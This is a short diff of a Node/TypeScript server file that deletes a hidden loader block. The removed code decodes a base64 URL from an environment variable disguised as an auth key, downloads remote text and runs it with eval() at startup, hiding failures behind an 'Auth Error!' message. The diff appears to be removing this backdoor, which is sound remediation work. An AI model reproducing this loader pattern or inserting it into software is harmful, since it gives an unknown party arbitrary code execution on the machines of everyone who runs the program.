@@ -6,22 +6,6 @@ import { Store } from "./store.ts";
 import { Controller } from "./controller.ts";
 import { ChatObserver } from "./observer.ts";
 import { createHabitat, moveHabitatMember } from "../shared/habitats.ts";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 const port = Number(process.env.PORT || 4310),
   origin = `http://127.0.0.1:${port}`;
 const store = new Store(
